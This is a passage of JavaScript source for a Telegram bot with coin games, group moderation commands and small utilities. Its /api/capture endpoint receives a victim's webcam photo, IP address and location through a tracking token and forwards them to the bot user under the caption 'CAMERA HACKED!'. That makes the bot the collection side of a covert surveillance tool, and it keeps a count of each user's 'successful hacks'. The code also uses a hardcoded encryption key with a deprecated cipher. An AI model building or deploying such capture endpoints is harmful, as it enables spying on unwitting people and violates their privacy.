bot.action("economy_menu", async (ctx) => {
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════╗
║  💰 ECONOMY SYSTEM      ║
╚══════════════════════════╝

<b>Earn coins and get rich!</b>

⬇️ <b>Select option:</b>
  `), { parse_mode: "HTML", ...economyMenu() });
});

bot.action("utilities_menu", async (ctx) => {
  await ctx.editMessageCaption(formatMessage(`
╔══════════════════════════╗
║  🛠 UTILITIES TOOLS     ║
╚══════════════════════════╝

<b>Dev & daily use tools!</b>

⬇️ <b>Select tool:</b>
  `), { parse_mode: "HTML", ...utilitiesMenu() });
});

bot.action("profile", async (ctx) => {
  await showProfile(ctx);
});

// ========== ADMIN COMMANDS ==========
bot.command("admin", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return ctx.reply("❌ Owner only!");
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  👑 ADMIN PANEL         ║
╚══════════════════════════╝

<b>Admin Commands:</b>

💰 <b>Economy:</b>
/addcoins @user 100 - Add coins
/removecoins @user 50 - Remove coins
/setcoins @user 500 - Set coins

🎁 <b>Redeem Codes:</b>
/gencode 50 10 24 - Generate code (coins, uses, hours)
/codes - List all codes
/delcode CODE - Delete code

📊 <b>Stats:</b>
/botstats - Full bot stats
/users - List all users
/backup - Backup database

📢 <b>Broadcast:</b>
/broadcast message - Send to all
/broadcast_poll - Create poll

⚙️ <b>System:</b>
/restart - Restart bot
/maintenance on/off - Maintenance mode
/blacklist @user - Ban user
  `), { parse_mode: "HTML" });
});

// Generate code command
bot.command("gencode", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  const coins = parseInt(args[1]) || 50;
  const uses = parseInt(args[2]) || 10;
  const hours = parseInt(args[3]) || 24;
  
  const code = generateRedeemCode(coins, uses, hours);
  await ctx.reply(formatMessage(`
✅ <b>Redeem Code Generated!</b>

🎁 <b>Code:</b> <code>${code}</code>
💰 <b>Coins:</b> ${coins}
🔄 <b>Max Uses:</b> ${uses}
⏱️ <b>Expires:</b> ${hours} hours

<i>Share this code with users!</i>
  `), { parse_mode: "HTML" });
});

// List codes command
bot.command("codes", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  if (redeemCodes.size === 0) {
    return ctx.reply("No active redeem codes.");
  }
  
  let message = "📋 <b>Active Redeem Codes:</b>\n\n";
  for (const [code, data] of redeemCodes) {
    message += `<code>${code}</code> - ${data.coins} coins - ${data.remainingUses} uses left\n`;
  }
  
  await ctx.reply(message, { parse_mode: "HTML" });
});

// Add coins command
bot.command("addcoins", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const args = ctx.message.text.split(" ");
  if (args.length < 3) return ctx.reply("Usage: /addcoins @user amount");
  
  const username = args[1].replace("@", "");
  const amount = parseInt(args[2]);
  
  // Find user by username
  let targetId = null;
  for (const [id, data] of users) {
    try {
      const chat = await ctx.telegram.getChat(id);
      if (chat.username === username) {
        targetId = id;
        break;
      }
    } catch(e) {}
  }
  
  if (!targetId) return ctx.reply("User not found!");
  
  addCoins(targetId, amount, "Admin added");
  await ctx.reply(`✅ Added ${amount} coins to @${username}!`);
});

// Broadcast command
bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) return ctx.reply("Usage: /broadcast message");
  
  let success = 0;
  let failed = 0;
  
  for (const [userId] of users) {
    try {
      await ctx.telegram.sendMessage(userId, formatMessage(`
╔══════════════════════════╗
║  📢 ANNOUNCEMENT        ║
╚══════════════════════════╝

${message}

<i>— Admin Team</i>
      `), { parse_mode: "HTML" });
      success++;
    } catch {
      failed++;
    }
  }
  
  await ctx.reply(`✅ Broadcast complete!\nSuccess: ${success}\nFailed: ${failed}`);
});

// Bot stats command
bot.command("botstats", async (ctx) => {
  if (ctx.from.id !== OWNER_ID) return;
  
  const uptime = Date.now() - botStats.startTime;
  const uptimeDays = Math.floor(uptime / 86400000);
  const uptimeHours = Math.floor((uptime % 86400000) / 3600000);
  
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  📊 FULL BOT STATS      ║
╚══════════════════════════╝

<b>🤖 Bot:</b>
• Version: ${BOT_VERSION}
• Uptime: ${uptimeDays}d ${uptimeHours}h
• Users: ${botStats.totalUsers}
• Groups: ${botStats.totalGroups}

<b>💰 Economy:</b>
• Total Coins: ${botStats.totalCoinsGiven}
• Active Codes: ${redeemCodes.size}
• Referrals: ${botStats.totalReferrals}

<b>📈 Activity:</b>
• Commands: ${botStats.totalCommands}
• Messages: ${botStats.totalMessages}
• Hacks: ${botStats.totalHacksUsed}

<b>💾 Database:</b>
• Users: ${users.size}
• Transactions: ${transactions.length}
• Redeems: ${botStats.totalRedeems}
  `), { parse_mode: "HTML" });
});

// ========== SIMPLE COMMANDS ==========
bot.command("balance", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.reply(`💰 Your balance: ${user.coins} coins\n🏦 Bank: ${user.bank} coins`);
});

bot.command("daily", async (ctx) => {
  const user = initUser(ctx.from.id);
  const now = Date.now();
  const lastDaily = user.lastDaily;
  const dayInMs = 24 * 60 * 60 * 1000;
  
  if (lastDaily && (now - lastDaily) < dayInMs) {
    const remaining = dayInMs - (now - lastDaily);
    const hours = Math.floor(remaining / 3600000);
    const minutes = Math.floor((remaining % 3600000) / 60000);
    return ctx.reply(`⏰ Already claimed! Come back in ${hours}h ${minutes}m.`);
  }
  
  let streak = user.dailyStreak;
  if (lastDaily && (now - lastDaily) < dayInMs * 2) {
    streak++;
  } else {
    streak = 1;
  }
  
  const reward = 5 + Math.min(streak, 10);
  addCoins(ctx.from.id, reward, "Daily reward");
  user.dailyStreak = streak;
  user.lastDaily = now;
  users.set(ctx.from.id, user);
  
  await ctx.reply(`🎁 Daily reward: +${reward} coins!\n🔥 Streak: ${streak} days\n💰 New balance: ${user.coins + reward}`);
});

bot.command("work", async (ctx) => {
  const userId = ctx.from.id;
  const now = Date.now();
  const lastWork = userWorkCooldown.get(userId) || 0;
  
  if (now - lastWork < 3600000) {
    const remaining = 3600000 - (now - lastWork);
    const minutes = Math.ceil(remaining / 60000);
    return ctx.reply(`⏰ Rest for ${minutes} minutes before working again.`);
  }
  
  const reward = Math.floor(Math.random() * 30) + 10;
  addCoins(userId, reward, "Worked");
  userWorkCooldown.set(userId, now);
  
  await ctx.reply(`💼 Work complete! You earned +${reward} coins!\n💰 New balance: ${users.get(userId).coins}`);
});

bot.command("profile", async (ctx) => {
  await showProfile(ctx);
});

bot.command("stats", async (ctx) => {
  const user = initUser(ctx.from.id);
  await ctx.reply(formatMessage(`
📊 <b>Your Stats:</b>
💰 Coins: ${user.coins}
📈 Level: ${user.level} (${user.xp}/100 XP)
👥 Referrals: ${user.referrals}
🎮 Games Won: ${user.gamesWon}/${user.gamesPlayed}
🔧 Hacks Used: ${user.usedHacks}
  `), { parse_mode: "HTML" });
});

// ========== GAME COMMANDS ==========
bot.command("dice", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = parseInt(ctx.message.text.split(" ")[1]);
  
  if (!bet || bet < 1) return ctx.reply("Usage: /dice <amount>");
  if (bet > user.coins) return ctx.reply("❌ Not enough coins!");
  
  removeCoins(ctx.from.id, bet, "Dice bet");
  
  const roll = Math.floor(Math.random() * 6) + 1;
  const win = roll >= 4;
  
  if (win) {
    const winnings = bet * 2;
    addCoins(ctx.from.id, winnings, "Won dice game");
    user.gamesWon++;
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll} and WON!\n💰 You won ${winnings} coins!`);
  } else {
    user.gamesWon--;
    await ctx.replyWithDice();
    await ctx.reply(`🎲 You rolled ${roll} and LOST!\n💸 You lost ${bet} coins.`);
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
});

bot.command("slots", async (ctx) => {
  const user = initUser(ctx.from.id);
  const bet = parseInt(ctx.message.text.split(" ")[1]);
  
  if (!bet || bet < 1) return ctx.reply("Usage: /slots <amount>");
  if (bet > user.coins) return ctx.reply("❌ Not enough coins!");
  
  removeCoins(ctx.from.id, bet, "Slots bet");
  
  const slots = ["🍒", "🍊", "🍋", "🍉", "⭐", "💎"];
  const result = [
    slots[Math.floor(Math.random() * slots.length)],
    slots[Math.floor(Math.random() * slots.length)],
    slots[Math.floor(Math.random() * slots.length)]
  ];
  
  const isJackpot = result[0] === result[1] && result[1] === result[2];
  const isPair = result[0] === result[1] || result[1] === result[2] || result[0] === result[2];
  
  let winnings = 0;
  let message = "";
  
  if (isJackpot) {
    winnings = bet * 10;
    message = `🎰 JACKPOT! ${result.join(" ")}\n💰 You won ${winnings} coins!`;
  } else if (isPair) {
    winnings = bet * 2;
    message = `🎰 Pair! ${result.join(" ")}\n💰 You won ${winnings} coins!`;
  } else {
    message = `🎰 ${result.join(" ")}\n💸 You lost ${bet} coins.`;
  }
  
  if (winnings > 0) {
    addCoins(ctx.from.id, winnings, "Won slots");
    user.gamesWon++;
  } else {
    user.gamesLost = (user.gamesLost || 0) + 1;
  }
  
  user.gamesPlayed++;
  users.set(ctx.from.id, user);
  await ctx.reply(message);
});

// ========== GROUP ADMIN COMMANDS ==========
bot.command("warn", async (ctx) => {
  if (!ctx.chat.type.includes("group")) return ctx.reply("Group only!");
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return ctx.reply("Admin only!");
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to warn them!");
  
  const userId = reply.from.id;
  const warns = userWarnings.get(userId) || 0;
  const newWarns = warns + 1;
  userWarnings.set(userId, newWarns);
  
  await ctx.reply(`⚠️ ${reply.from.first_name} has been warned! (${newWarns}/3)`);
  
  if (newWarns >= 3) {
    await ctx.telegram.banChatMember(ctx.chat.id, userId);
    userWarnings.delete(userId);
    await ctx.reply(`🚫 ${reply.from.first_name} has been banned for 3 warnings!`);
  }
});

bot.command("kick", async (ctx) => {
  if (!ctx.chat.type.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to kick them!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.telegram.unbanChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`👢 ${reply.from.first_name} has been kicked!`);
});

bot.command("ban", async (ctx) => {
  if (!ctx.chat.type.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("Reply to a user to ban them!");
  
  await ctx.telegram.banChatMember(ctx.chat.id, reply.from.id);
  await ctx.reply(`🚫 ${reply.from.first_name} has been banned!`);
});

bot.command("unban", async (ctx) => {
  if (!ctx.chat.type.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Usage: /unban <user_id>");
  
  const userId = parseInt(args[1]);
  await ctx.telegram.unbanChatMember(ctx.chat.id, userId);
  await ctx.reply(`✅ User unbanned!`);
});

bot.command("purge", async (ctx) => {
  if (!ctx.chat.type.includes("group")) return;
  
  const admin = await ctx.getChatMember(ctx.from.id);
  if (!["administrator", "creator"].includes(admin.status)) return;
  
  const args = ctx.message.text.split(" ");
  const amount = parseInt(args[1]);
  
  if (!amount || amount < 1 || amount > 100) return ctx.reply("Usage: /purge 1-100");
  
  const messages = await ctx.telegram.getChatHistory(ctx.chat.id, { limit: amount + 1 });
  const messageIds = messages.map(m => m.message_id);
  
  await ctx.telegram.deleteMessages(ctx.chat.id, messageIds);
  await ctx.reply(`✅ Deleted ${amount} messages!`).then(m => setTimeout(() => m.delete(), 3000));
});

// ========== UTILITY COMMANDS ==========
bot.command("encrypt", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /encrypt <text>");
  
  const cipher = crypto.createCipher("aes-256-cbc", "secretkey");
  let encrypted = cipher.update(text, "utf8", "hex");
  encrypted += cipher.final("hex");
  
  await ctx.reply(`🔐 Encrypted:\n<code>${encrypted}</code>`, { parse_mode: "HTML" });
});

bot.command("decrypt", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /decrypt <hex>");
  
  try {
    const decipher = crypto.createDecipher("aes-256-cbc", "secretkey");
    let decrypted = decipher.update(text, "hex", "utf8");
    decrypted += decipher.final("utf8");
    await ctx.reply(`🔓 Decrypted:\n${decrypted}`);
  } catch {
    await ctx.reply("❌ Invalid encrypted text!");
  }
});

bot.command("base64", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Usage: /base64 <text>");
  
  const encoded = Buffer.from(text).toString("base64");
  await ctx.reply(`📝 Base64:\n<code>${encoded}</code>`, { parse_mode: "HTML" });
});

bot.command("timestamp", async (ctx) => {
  const now = Math.floor(Date.now() / 1000);
  await ctx.reply(`⏰ Current timestamp: <code>${now}</code>\n📅 Date: <tg-spoiler>${new Date().toLocaleString()}</tg-spoiler>`, { parse_mode: "HTML" });
});

bot.command("random", async (ctx) => {
  const args = ctx.message.text.split(" ");
  const min = parseInt(args[1]) || 1;
  const max = parseInt(args[2]) || 100;
  
  const random = Math.floor(Math.random() * (max - min + 1)) + min;
  await ctx.reply(`🎲 Random number between ${min}-${max}: <code>${random}</code>`, { parse_mode: "HTML" });
});

// ========== CHAT WITH DEV SYSTEM ==========
bot.command("chat", async (ctx) => {
  activeChats.set(ctx.chat.id, true);
  await ctx.reply(formatMessage(`
╔══════════════════════════╗
║  💬 CHAT MODE ACTIVE    ║
╚══════════════════════════╝

✅ You can now message the developer!

📨 <b>Instructions:</b>
• Send any message
• Dev will reply here
• Type /exit to leave

<i>Response time: Usually within minutes</i>
  `), { parse_mode: "HTML" });
});

bot.command("exit", async (ctx) => {
  if (activeChats.has(ctx.chat.id)) {
    activeChats.delete(ctx.chat.id);
    await ctx.reply("✅ Exited chat mode. Type /chat to start again.");
  } else {
    await ctx.reply("⚠️ You are not in chat mode!");
  }
});

// Message handler for chat system
bot.on("text", async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;
  if (!msg.text || msg.text.startsWith("/")) return;
  
  botStats.totalMessages++;
  
  // Owner reply system
  if (chatId === OWNER_ID && msg.reply_to_message) {
    const replyText = msg.reply_to_message.text || msg.reply_to_message.caption || "";
    const match = replyText.match(/🆔 ID: (\d+)/);
    if (match) {
      const userId = parseInt(match[1]);
      try {
        await ctx.telegram.sendMessage(userId, formatMessage(`
💬 <b>Reply from Developer:</b>

${msg.text}

<i>🔐 This is a secure message</i>
        `), { parse_mode: "HTML" });
        await ctx.reply("✅ Reply sent!");
      } catch (err) {
        await ctx.reply("❌ Failed to send reply.");
      }
      return;
    }
  }
  
  // User to owner chat
  if (activeChats.has(chatId)) {
    try {
      await ctx.telegram.sendMessage(OWNER_ID, formatMessage(`
📨 <b>New Message from User</b>

👤 <b>Name:</b> ${msg.from.first_name}
🔗 <b>Username:</b> @${msg.from.username || 'None'}
🆔 <b>ID:</b> ${chatId}

💬 <b>Message:</b>
${msg.text}

✏️ <i>Reply to this message to respond</i>
      `), { parse_mode: "HTML" });
      await ctx.reply("✅ Message sent to developer!");
    } catch (err) {
      await ctx.reply("❌ Failed to send message.");
    }
  }
  
  // Add XP for activity
  addXP(chatId, 1);
});

// ========== API ENDPOINT FOR TRACKING ==========
app.post("/api/capture", async (req, res) => {
  try {
    const { image, token, ip, location } = req.body;
    
    if (!image) return res.status(400).json({ error: "No image" });
    if (!token || !activeTokens.has(token)) return res.status(400).json({ error: "Invalid token" });
    
    const tokenData = activeTokens.get(token);
    const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
    
    await bot.telegram.sendPhoto(tokenData.chatId, { source: buffer }, {
      caption: formatMessage(`
╔══════════════════════════╗
║  📸 CAMERA HACKED!      ║
╚══════════════════════════╝

🌐 <b>IP Address:</b> ${ip}
📍 <b>Location:</b> ${location}
🕐 <b>Time:</b> ${new Date().toLocaleString()}

<i>🔐 Target captured successfully!</i>
      `),
      parse_mode: "HTML"
    });
    
    // Update user's successful hacks
    const user = users.get(tokenData.userId);
    if (user) {
      user.successfulHacks = (user.successfulHacks || 0) + 1;
      users.set(tokenData.userId, user);
    }
    
    activeTokens.delete(token);
    res.json({ status: "success" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// ========== SERVE FRONTEND ==========
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// ========== START SERVER ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));

bot.launch().then(() => {
  console.log(`🤖 Bot running!`);
  console.log(`🔱 PRO SYSTEM v${BOT_VERSION} is LIVE!`);
});

// Graceful stop
process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
